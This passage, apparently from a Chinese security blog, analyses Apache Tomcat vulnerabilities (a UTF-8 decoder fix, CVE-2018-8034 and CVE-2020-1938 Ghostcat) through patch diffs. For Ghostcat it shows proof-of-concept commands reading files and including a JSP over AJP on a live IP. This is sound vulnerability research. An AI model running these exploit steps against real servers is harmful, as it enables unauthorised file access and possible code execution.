class="number">0xD7C0</span>);</span><br></pre></td></tr></table></figure><p>由于UTF8是可边长的编码方式，因此需要逐字节的判断是否符合UTF8标准，以及该编码的长度是几个字节</p><p>对于一个ByteBuffer类型，以下是我们需要关注的属性</p><ul><li><code>position</code>：当前的下标位置，表示进行下一个读写操作时的起始位置</li><li><code>limit</code>：结束标记下标，表示进行下一个读写操作时的（最大）结束位置</li><li><code>capacity</code>：该ByteBuffer容量</li><li><code>remaining</code>;该ByteBuffer当前的剩余可用长度</li></ul><p>为了防止缓冲区溢出，在<code>decodeHasArray</code>函数中对<code>UTF8</code>解码时，需要一直关注以上4个属性，尤其是解码后存放结果的<code>Buffer</code>的<code>remaining</code>属性</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-10-30-014924.png" alt="image-20201030094923715"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> CoderResult <span class="title">decodeHasArray</span><span class="params">(ByteBuffer in, CharBuffer out)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> outRemaining = out.remaining();</span><br><span class="line">    <span class="keyword">int</span> pos = in.position();</span><br><span class="line">    <span class="keyword">int</span> limit = in.limit();</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] bArr = in.array();</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">char</span>[] cArr = out.array();</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> inIndexLimit = limit + in.arrayOffset();</span><br><span class="line">    <span class="keyword">int</span> inIndex = pos + in.arrayOffset();</span><br><span class="line">    <span class="keyword">int</span> outIndex = out.position() + out.arrayOffset();</span><br><span class="line">    <span class="comment">// if someone would change the limit in process,</span></span><br><span class="line">    <span class="comment">// he would face consequences</span></span><br><span class="line">    <span class="keyword">for</span> (; inIndex &lt; inIndexLimit &amp;&amp; outRemaining &gt; <span class="number">0</span>; inIndex++) &#123;</span><br><span class="line">        <span class="keyword">int</span> jchar = bArr[inIndex];</span><br><span class="line">        <span class="keyword">if</span> (jchar &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            jchar = jchar &amp; <span class="number">0x7F</span>;</span><br><span class="line">            <span class="comment">// If first byte is invalid, tail will be set to -1</span></span><br><span class="line">            <span class="keyword">int</span> tail = remainingBytes[jchar];</span><br><span class="line">            <span class="keyword">if</span> (tail == -<span class="number">1</span>) &#123;</span><br><span class="line">                in.position(inIndex - in.arrayOffset());</span><br><span class="line">                out.position(outIndex - out.arrayOffset());</span><br><span class="line">                <span class="keyword">return</span> CoderResult.malformedForLength(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Additional checks to detect invalid sequences ASAP</span></span><br><span class="line">            <span class="comment">// Checks derived from Unicode 6.2, Chapter 3, Table 3-7</span></span><br><span class="line">            <span class="comment">// Check 2nd byte</span></span><br><span class="line">            <span class="keyword">int</span> tailAvailable = inIndexLimit - inIndex - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (tailAvailable &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// First byte C2..DF, second byte 80..BF</span></span><br><span class="line">                <span class="keyword">if</span> (jchar &gt; <span class="number">0x41</span> &amp;&amp; jchar &lt; <span class="number">0x60</span> &amp;&amp;</span><br><span class="line">                        (bArr[inIndex + <span class="number">1</span>] &amp; <span class="number">0xC0</span>) != <span class="number">0x80</span>) &#123;</span><br><span class="line">                    in.position(inIndex - in.arrayOffset());</span><br><span class="line">                    out.position(outIndex - out.arrayOffset());</span><br><span class="line">                    <span class="keyword">return</span> CoderResult.malformedForLength(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// First byte E0, second byte A0..BF</span></span><br><span class="line">                <span class="keyword">if</span> (jchar == <span class="number">0x60</span> &amp;&amp; (bArr[inIndex + <span class="number">1</span>] &amp; <span class="number">0xE0</span>) != <span class="number">0xA0</span>) &#123;</span><br><span class="line">                    in.position(inIndex - in.arrayOffset());</span><br><span class="line">                    out.position(outIndex - out.arrayOffset());</span><br><span class="line">                    <span class="keyword">return</span> CoderResult.malformedForLength(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// First byte E1..EC, second byte 80..BF</span></span><br><span class="line">                <span class="keyword">if</span> (jchar &gt; <span class="number">0x60</span> &amp;&amp; jchar &lt; <span class="number">0x6D</span> &amp;&amp;</span><br><span class="line">                        (bArr[inIndex + <span class="number">1</span>] &amp; <span class="number">0xC0</span>) != <span class="number">0x80</span>) &#123;</span><br><span class="line">                    in.position(inIndex - in.arrayOffset());</span><br><span class="line">                    out.position(outIndex - out.arrayOffset());</span><br><span class="line">                    <span class="keyword">return</span> CoderResult.malformedForLength(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// First byte ED, second byte 80..9F</span></span><br><span class="line">                <span class="keyword">if</span> (jchar == <span class="number">0x6D</span> &amp;&amp; (bArr[inIndex + <span class="number">1</span>] &amp; <span class="number">0xE0</span>) != <span class="number">0x80</span>) &#123;</span><br><span class="line">                    in.position(inIndex - in.arrayOffset());</span><br><span class="line">                    out.position(outIndex - out.arrayOffset());</span><br><span class="line">                    <span class="keyword">return</span> CoderResult.malformedForLength(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// First byte EE..EF, second byte 80..BF</span></span><br><span class="line">                <span class="keyword">if</span> (jchar &gt; <span class="number">0x6D</span> &amp;&amp; jchar &lt; <span class="number">0x70</span> &amp;&amp;</span><br><span class="line">                        (bArr[inIndex + <span class="number">1</span>] &amp; <span class="number">0xC0</span>) != <span class="number">0x80</span>) &#123;</span><br><span class="line">                    in.position(inIndex - in.arrayOffset());</span><br><span class="line">                    out.position(outIndex - out.arrayOffset());</span><br><span class="line">                    <span class="keyword">return</span> CoderResult.malformedForLength(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// First byte F0, second byte 90..BF</span></span><br><span class="line">                <span class="keyword">if</span> (jchar == <span class="number">0x70</span> &amp;&amp;</span><br><span class="line">                        ((bArr[inIndex + <span class="number">1</span>] &amp; <span class="number">0xFF</span>) &lt; <span class="number">0x90</span> ||</span><br><span class="line">                        (bArr[inIndex + <span class="number">1</span>] &amp; <span class="number">0xFF</span>) &gt; <span class="number">0xBF</span>)) &#123;</span><br><span class="line">                    in.position(inIndex - in.arrayOffset());</span><br><span class="line">                    out.position(outIndex - out.arrayOffset());</span><br><span class="line">                    <span class="keyword">return</span> CoderResult.malformedForLength(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// First byte F1..F3, second byte 80..BF</span></span><br><span class="line">                <span class="keyword">if</span> (jchar &gt; <span class="number">0x70</span> &amp;&amp; jchar &lt; <span class="number">0x74</span> &amp;&amp;</span><br><span class="line">                        (bArr[inIndex + <span class="number">1</span>] &amp; <span class="number">0xC0</span>) != <span class="number">0x80</span>) &#123;</span><br><span class="line">                    in.position(inIndex - in.arrayOffset());</span><br><span class="line">                    out.position(outIndex - out.arrayOffset());</span><br><span class="line">                    <span class="keyword">return</span> CoderResult.malformedForLength(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// First byte F4, second byte 80..8F</span></span><br><span class="line">                <span class="keyword">if</span> (jchar == <span class="number">0x74</span> &amp;&amp;</span><br><span class="line">                        (bArr[inIndex + <span class="number">1</span>] &amp; <span class="number">0xF0</span>) != <span class="number">0x80</span>) &#123;</span><br><span class="line">                    in.position(inIndex - in.arrayOffset());</span><br><span class="line">                    out.position(outIndex - out.arrayOffset());</span><br><span class="line">                    <span class="keyword">return</span> CoderResult.malformedForLength(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Check third byte if present and expected</span></span><br><span class="line">            <span class="keyword">if</span> (tailAvailable &gt; <span class="number">1</span> &amp;&amp; tail &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((bArr[inIndex + <span class="number">2</span>] &amp; <span class="number">0xC0</span>) != <span class="number">0x80</span>) &#123;</span><br><span class="line">                    in.position(inIndex - in.arrayOffset());</span><br><span class="line">                    out.position(outIndex - out.arrayOffset());</span><br><span class="line">                    <span class="keyword">return</span> CoderResult.malformedForLength(<span class="number">2</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Check fourth byte if present and expected</span></span><br><span class="line">            <span class="keyword">if</span> (tailAvailable &gt; <span class="number">2</span> &amp;&amp; tail &gt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((bArr[inIndex + <span class="number">3</span>] &amp; <span class="number">0xC0</span>) != <span class="number">0x80</span>) &#123;</span><br><span class="line">                    in.position(inIndex - in.arrayOffset());</span><br><span class="line">                    out.position(outIndex - out.arrayOffset());</span><br><span class="line">                    <span class="keyword">return</span> CoderResult.malformedForLength(<span class="number">3</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (tailAvailable &lt; tail) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tail; i++) &#123;</span><br><span class="line">                <span class="keyword">int</span> nextByte = bArr[inIndex + i + <span class="number">1</span>] &amp; <span class="number">0xFF</span>;</span><br><span class="line">                <span class="keyword">if</span> ((nextByte &amp; <span class="number">0xC0</span>) != <span class="number">0x80</span>) &#123;</span><br><span class="line">                    in.position(inIndex - in.arrayOffset());</span><br><span class="line">                    out.position(outIndex - out.arrayOffset());</span><br><span class="line">                    <span class="keyword">return</span> CoderResult.malformedForLength(<span class="number">1</span> + i);</span><br><span class="line">                &#125;</span><br><span class="line">                jchar = (jchar &lt;&lt; <span class="number">6</span>) + nextByte;</span><br><span class="line">            &#125;</span><br><span class="line">            jchar -= remainingNumbers[tail];</span><br><span class="line">            <span class="keyword">if</span> (jchar &lt; lowerEncodingLimit[tail]) &#123;</span><br><span class="line">                <span class="comment">// Should have been encoded in fewer octets</span></span><br><span class="line">                in.position(inIndex - in.arrayOffset());</span><br><span class="line">                out.position(outIndex - out.arrayOffset());</span><br><span class="line">                <span class="keyword">return</span> CoderResult.malformedForLength(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            inIndex += tail;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Apache Tomcat added test</span></span><br><span class="line">        <span class="keyword">if</span> (jchar &gt;= <span class="number">0xD800</span> &amp;&amp; jchar &lt;= <span class="number">0xDFFF</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> CoderResult.unmappableForLength(<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Apache Tomcat added test</span></span><br><span class="line">        <span class="keyword">if</span> (jchar &gt; <span class="number">0x10FFFF</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> CoderResult.unmappableForLength(<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (jchar &lt;= <span class="number">0xffff</span>) &#123;</span><br><span class="line">            cArr[outIndex++] = (<span class="keyword">char</span>) jchar;</span><br><span class="line">            outRemaining--;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (outRemaining &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> CoderResult.OVERFLOW;</span><br><span class="line">            &#125;</span><br><span class="line">            cArr[outIndex++] = (<span class="keyword">char</span>) ((jchar &gt;&gt; <span class="number">0xA</span>) + <span class="number">0xD7C0</span>);</span><br><span class="line">            cArr[outIndex++] = (<span class="keyword">char</span>) ((jchar &amp; <span class="number">0x3FF</span>) + <span class="number">0xDC00</span>);</span><br><span class="line">            outRemaining -= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    in.position(inIndex - in.arrayOffset());</span><br><span class="line">    out.position(outIndex - out.arrayOffset());</span><br><span class="line">    <span class="keyword">return</span> (outRemaining == <span class="number">0</span> &amp;&amp; inIndex &lt; inIndexLimit) ?</span><br><span class="line">            CoderResult.OVERFLOW :</span><br><span class="line">            CoderResult.UNDERFLOW;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从<code>UNICODE-UTF8</code>转换表中可以看到，对于一个正常的UTF8编码，每个字节的首位都是1，因此在代码中使用<code>int jchar = bArr[inIndex];</code>得到的必然是负数，同时对标准的<code>1 2 3 4</code>字节长度的<code>UTF8</code>解码也会在判断<code>if (jchar &lt; 0)</code>中完成，当然这个判断也并不是处理了所有的情况，当所有判断<code>tail</code>长度的if通过后，进入了下面decode的循环</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tail; i++) &#123;</span><br><span class="line">    <span class="keyword">int</span> nextByte = bArr[inIndex + i + <span class="number">1</span>] &amp; <span class="number">0xFF</span>;</span><br><span class="line">    <span class="keyword">if</span> ((nextByte &amp; <span class="number">0xC0</span>) != <span class="number">0x80</span>) &#123;</span><br><span class="line">        in.position(inIndex - in.arrayOffset());</span><br><span class="line">        out.position(outIndex - out.arrayOffset());</span><br><span class="line">        <span class="keyword">return</span> CoderResult.malformedForLength(<span class="number">1</span> + i);</span><br><span class="line">    &#125;</span><br><span class="line">    jchar = (jchar &lt;&lt; <span class="number">6</span>) + nextByte;</span><br><span class="line">&#125;</span><br><span class="line">jchar -= remainingNumbers[tail];</span><br></pre></td></tr></table></figure><p>最后得到的<code>jchar</code>就是<code>UTF8</code>解码后的值，最后在下面的判断中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (jchar &lt;= <span class="number">0xffff</span>) &#123;</span><br><span class="line">    cArr[outIndex++] = (<span class="keyword">char</span>) jchar;</span><br><span class="line">    outRemaining--;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (outRemaining &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> CoderResult.OVERFLOW;</span><br><span class="line">    &#125;</span><br><span class="line">    cArr[outIndex++] = (<span class="keyword">char</span>) ((jchar &gt;&gt; <span class="number">0xA</span>) + <span class="number">0xD7C0</span>);</span><br><span class="line">    cArr[outIndex++] = (<span class="keyword">char</span>) ((jchar &amp; <span class="number">0x3FF</span>) + <span class="number">0xDC00</span>);</span><br><span class="line">    outRemaining -= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>jchar&lt;=0xffff</code>是UTF8编码为2字节的情况，而在<code>jchar&gt;0xffff</code>时，其实就是编码为4字节的情况，当<code>outRemaining &lt; 2</code>时，也就是说输出的<code>Buffer</code>不足以放入这个值了，而<code>patch</code>修补的问题就是，在不足以放入这个值的时候，将原来<code>Buffer</code>的<code>index</code>往前回退</p><p>**疑惑：**从commit描述和代码审计来看，都没有发现会造成CVE描述中所说的无限循环</p><h3><span id="pcan-kao">参考</span><a href="#pcan-kao" class="header-anchor">#</a></h3><ul><li><a href="https://blog.csdn.net/mrliuzhao/article/details/89453082">https://blog.csdn.net/mrliuzhao/article/details/89453082</a></li><li><a href="https://github.com/apache/tomcat/commit/92cd494555598e99dd691712e8ee426a2f9c2e93">https://github.com/apache/tomcat/commit/92cd494555598e99dd691712e8ee426a2f9c2e93</a></li><li><a href="https://zh.wikipedia.org/wiki/UTF-8">https://zh.wikipedia.org/wiki/UTF-8</a></li></ul><h2><span id="pcve-2018-8034">CVE-2018-8034</span><a href="#pcve-2018-8034" class="header-anchor">#</a></h2><blockquote><p>The host name verification when using TLS with the WebSocket client was missing. It is now enabled by default. Versions Affected: Apache Tomcat 9.0.0.M1 to 9.0.9, 8.5.0 to 8.5.31, 8.0.0.RC1 to 8.0.52, and 7.0.35 to 7.0.88.</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">@@ -<span class="number">328</span>,<span class="number">7</span> +<span class="number">329</span>,<span class="number">7</span> @@ <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WsWebSocketContainer</span> <span class="keyword">implements</span> <span class="title">WebSocketContainer</span>, <span class="title">BackgroundProce</span></span></span><br><span class="line"><span class="class">             // <span class="title">Regardless</span> <span class="title">of</span> <span class="title">whether</span> <span class="title">a</span> <span class="title">non</span>-<span class="title">secure</span> <span class="title">wrapper</span> <span class="title">was</span> <span class="title">created</span> <span class="title">for</span> <span class="title">a</span></span></span><br><span class="line"><span class="class">             // <span class="title">proxy</span> <span class="title">CONNECT</span>, <span class="title">need</span> <span class="title">to</span> <span class="title">use</span> <span class="title">TLS</span> <span class="title">from</span> <span class="title">this</span> <span class="title">point</span> <span class="title">on</span> <span class="title">so</span> <span class="title">wrap</span> <span class="title">the</span></span></span><br><span class="line"><span class="class">             // <span class="title">original</span> <span class="title">AsynchronousSocketChannel</span></span></span><br><span class="line"><span class="class">-            <span class="title">SSLEngine</span> <span class="title">sslEngine</span> </span>= createSSLEngine(userProperties);</span><br><span class="line">+            SSLEngine sslEngine = createSSLEngine(userProperties, host, port);</span><br><span class="line">             channel = <span class="keyword">new</span> AsyncChannelWrapperSecure(socketChannel, sslEngine);</span><br><span class="line">         &#125; <span class="keyword">else</span> <span class="keyword">if</span> (channel == <span class="keyword">null</span>) &#123;</span><br><span class="line">             <span class="comment">// Only need to wrap as this point if it wasn't wrapped to process a</span></span><br><span class="line">@@ -<span class="number">866</span>,<span class="number">7</span> +<span class="number">867</span>,<span class="number">7</span> @@ <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WsWebSocketContainer</span> <span class="keyword">implements</span> <span class="title">WebSocketContainer</span>, <span class="title">BackgroundProce</span></span></span><br><span class="line"><span class="class">     &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">-    <span class="title">private</span> <span class="title">SSLEngine</span> <span class="title">createSSLEngine</span>(<span class="title">Map</span>&lt;<span class="title">String</span>,<span class="title">Object</span>&gt; <span class="title">userProperties</span>)</span></span><br><span class="line"><span class="class">+    <span class="title">private</span> <span class="title">SSLEngine</span> <span class="title">createSSLEngine</span>(<span class="title">Map</span>&lt;<span class="title">String</span>,<span class="title">Object</span>&gt; <span class="title">userProperties</span>, <span class="title">String</span> <span class="title">host</span>, <span class="title">int</span> <span class="title">port</span>)</span></span><br><span class="line"><span class="class">             <span class="title">throws</span> <span class="title">DeploymentException</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">@@ -<span class="number">904</span>,<span class="number">7</span> +<span class="number">905</span>,<span class="number">7</span> @@ <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WsWebSocketContainer</span> <span class="keyword">implements</span> <span class="title">WebSocketContainer</span>, <span class="title">BackgroundProce</span></span></span><br><span class="line"><span class="class">                 &#125;</span></span><br><span class="line"><span class="class">             &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">-            <span class="title">SSLEngine</span> <span class="title">engine</span> </span>= sslContext.createSSLEngine();</span><br><span class="line">+            SSLEngine engine = sslContext.createSSLEngine(host, port);</span><br><span class="line"></span><br><span class="line">             String sslProtocolsValue =</span><br><span class="line">                     (String) userProperties.get(Constants.SSL_PROTOCOLS_PROPERTY);</span><br><span class="line">@@ -<span class="number">914</span>,<span class="number">6</span> +<span class="number">915</span>,<span class="number">14</span> @@ <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WsWebSocketContainer</span> <span class="keyword">implements</span> <span class="title">WebSocketContainer</span>, <span class="title">BackgroundProce</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">             <span class="title">engine</span>.<span class="title">setUseClientMode</span>(<span class="title">true</span>)</span>;</span><br><span class="line"></span><br><span class="line">+            <span class="comment">// Enable host verification</span></span><br><span class="line">+            <span class="comment">// Start with current settings (returns a copy)</span></span><br><span class="line">+            SSLParameters sslParams = engine.getSSLParameters();</span><br><span class="line">+            <span class="comment">// Use HTTPS since WebSocket starts over HTTP(S)</span></span><br><span class="line">+            sslParams.setEndpointIdentificationAlgorithm(<span class="string">"HTTPS"</span>);</span><br><span class="line">+            <span class="comment">// Write the parameters back</span></span><br><span class="line">+            engine.setSSLParameters(sslParams);</span><br><span class="line">+</span><br><span class="line">             <span class="keyword">return</span> engine;</span><br><span class="line">         &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> DeploymentException(sm.getString(</span><br></pre></td></tr></table></figure><p>加入了对<code>host</code>和<code>port</code>的验证，用的<code>SSLEngine</code>是<code>java</code>自带的<code>SSLEngine</code>类，在建立是加入了<code>host</code>和<code>port</code>信息后，后续的SSL连接都只能与该主机通信。防止在通讯建立后，后续通信被中间人劫持</p><h3><span id="pcan-kao">参考</span><a href="#pcan-kao" class="header-anchor">#</a></h3><ul><li><p><a href="https://docs.oracle.com/javase/7/docs/api/javax/net/ssl/SSLEngine.html">https://docs.oracle.com/javase/7/docs/api/javax/net/ssl/SSLEngine.html</a></p></li><li><p><a href="https://github.com/apache/tomcat/commit/2835bb4e030c1c741ed0847bb3b9c3822e4fbc8a">https://github.com/apache/tomcat/commit/2835bb4e030c1c741ed0847bb3b9c3822e4fbc8a</a></p></li></ul>]]></content>
      <categories>
        <category>CTF</category>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-1938</title>
    <url>/f95006f9.html</url>
    <content><![CDATA[<h3><span id="pji-ben-xin-xi">基本信息</span><a href="#pji-ben-xin-xi" class="header-anchor">#</a></h3><blockquote><p>When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache Tomcat. Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection. If such connections are available to an attacker, they can be exploited in ways that may be surprising. In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99, Tomcat shipped with an AJP Connector enabled by default that listened on all configured IP addresses. It was expected (and recommended in the security guide) that this Connector would be disabled if not required. This vulnerability report identified a mechanism that allowed: - returning arbitrary files from anywhere in the web application - processing any file in the web application as a JSP Further, if the web application allowed file upload and stored those files within the web application (or the attacker was able to control the content of the web application by some other means) then this, along with the ability to process a file as a JSP, made remote code execution possible. It is important to note that mitigation is only required if an AJP port is accessible to untrusted users. Users wishing to take a defence-in-depth approach and block the vector that permits returning arbitrary files and execution as JSP may upgrade to Apache Tomcat 9.0.31, 8.5.51 or 7.0.100 or later. A number of changes were made to the default AJP Connector configuration in 9.0.31 to harden the default configuration. It is likely that users upgrading to 9.0.31, 8.5.51 or 7.0.100 or later will need to make small changes to their configurations.</p></blockquote><a id="more"></a><p>影响范围：</p><ul><li>7.0.0 - 7.0.99</li><li>8.5.0 - 8.5.50</li><li>9.0.0.M1 - 9.0.0.30</li></ul><h3><span id="plou-dong-fu-xian">漏洞复现</span><a href="#plou-dong-fu-xian" class="header-anchor">#</a></h3><h4><span id="phuan-jing-pei-zhi">环境配置</span><a href="#phuan-jing-pei-zhi" class="header-anchor">#</a></h4><p><code>./conf/server.xml</code>中默认已默认打开AJP</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">92     &lt;!-- Define an AJP 1.3 Connector on port 8009 --&gt;</span><br><span class="line">93     &lt;Connector port&#x3D;&quot;8009&quot; protocol&#x3D;&quot;AJP&#x2F;1.3&quot; redirectPort&#x3D;&quot;8443&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><h4><span id="pgong-ji">攻击</span><a href="#pgong-ji" class="header-anchor">#</a></h4><p>任意文件读</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># python CVE-2020-1938-read.py -p 8009 -f test.txt 47.100.18.67</span><br><span class="line">----------------------------</span><br><span class="line">This is Vulnerable CVE-2017-12617!</span><br></pre></td></tr></table></figure><p>任意文件包含</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// print.jsp</span></span><br><span class="line">&lt;%</span><br><span class="line">        out.print(<span class="string">"This is CVE-2020-1938"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># python CVE-2020-1938-include.py -p 8009 -f print.jsp 47.100.18.67</span><br><span class="line">----------------------------</span><br><span class="line">This is CVE-2020-1938</span><br></pre></td></tr></table></figure><h3><span id="pyuan-li">原理</span><a href="#pyuan-li" class="header-anchor">#</a></h3><h4><span id="prequest-prepare">Request Prepare</span><a href="#prequest-prepare" class="header-anchor">#</a></h4><p><code>./java/org/apache/coyote/ajp/AjpProcessor.java</code></p><p>对于<code>Ajp</code>请求，<code>Tomcat</code>使用<code>AjpProcessor</code>类处理用户的请求</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">163</span>            <span class="keyword">if</span> (!getErrorState().isError()) &#123;</span><br><span class="line">                <span class="comment">// Setting up filters, and parse some request headers</span></span><br><span class="line">                rp.setStage(org.apache.coyote.Constants.STAGE_PREPARE);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 准备请求（将用户的请求转换为内部的请求）</span></span><br><span class="line">                    prepareRequest();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    ExceptionUtils.handleThrowable(t);</span><br><span class="line">                    log.debug(sm.getString(<span class="string">"ajpprocessor.request.prepare"</span>), t);</span><br><span class="line">                    <span class="comment">// 500 - Internal Server Error</span></span><br><span class="line">                    response.setStatus(<span class="number">500</span>);</span><br><span class="line">                    setErrorState(ErrorState.CLOSE_CLEAN, t);</span><br><span class="line">                    getAdapter().log(request, response, <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>其中<code>PrepareRequest</code>方法继承自父类<code>AbstractAjpProcessor</code>，对请求进行预处理</p><p><code>./java/org/apache/coyote/ajp/AbstractAjpProcessor.java</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">746</span>    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">prepareRequest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">832</span>        <span class="keyword">while</span> ((attributeCode = requestHeaderMessage.getByte())</span><br><span class="line">                != Constants.SC_A_ARE_DONE) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (attributeCode) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> Constants.SC_A_REQ_ATTRIBUTE :</span><br><span class="line">                requestHeaderMessage.getBytes(tmpMB);</span><br><span class="line">                String n = tmpMB.toString();</span><br><span class="line">                requestHeaderMessage.getBytes(tmpMB);</span><br><span class="line">                String v = tmpMB.toString();</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * AJP13 misses to forward the local IP address and the</span></span><br><span class="line"><span class="comment">                 * remote port. Allow the AJP connector to add this info via</span></span><br><span class="line"><span class="comment">                 * private request attributes.</span></span><br><span class="line"><span class="comment">                 * We will accept the forwarded data and remove it from the</span></span><br><span class="line"><span class="comment">                 * public list of request attributes.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">if</span>(n.equals(Constants.SC_A_REQ_LOCAL_ADDR)) &#123;</span><br><span class="line">                    <span class="comment">// 赋值IP给request</span></span><br><span class="line">                    request.localAddr().setString(v);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span>(n.equals(Constants.SC_A_REQ_REMOTE_PORT)) &#123;</span><br><span class="line">                    <span class="comment">// 赋值端口给request</span></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        request.setRemotePort(Integer.parseInt(v));</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (NumberFormatException nfe) &#123;</span><br><span class="line">                        <span class="comment">// Ignore invalid value</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span>(n.equals(Constants.SC_A_SSL_PROTOCOL)) &#123;</span><br><span class="line">                      <span class="comment">// 将https属性加入key中</span></span><br><span class="line">                    request.setAttribute(SSLSupport.PROTOCOL_VERSION_KEY, v);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 其他情况直接加入key</span></span><br><span class="line">-                    request.setAttribute(n, v );</span><br><span class="line">                    <span class="comment">// All 'known' attributes will be processed by the previous</span></span><br><span class="line">                    <span class="comment">// blocks. Any remaining attribute is an 'arbitrary' one.</span></span><br><span class="line">+                    Pattern pattern = protocol.getAllowedArbitraryRequestAttributesPattern();</span><br><span class="line">+                    <span class="keyword">if</span> (pattern == <span class="keyword">null</span>) &#123;</span><br><span class="line">+                        response.setStatus(<span class="number">403</span>);</span><br><span class="line">+                        setErrorState(ErrorState.CLOSE_CLEAN, <span class="keyword">null</span>);</span><br><span class="line">+                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">+                        Matcher m = pattern.matcher(n);</span><br><span class="line">+                        <span class="keyword">if</span> (m.matches()) &#123;</span><br><span class="line">+                            request.setAttribute(n, v);</span><br><span class="line">+                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">+                            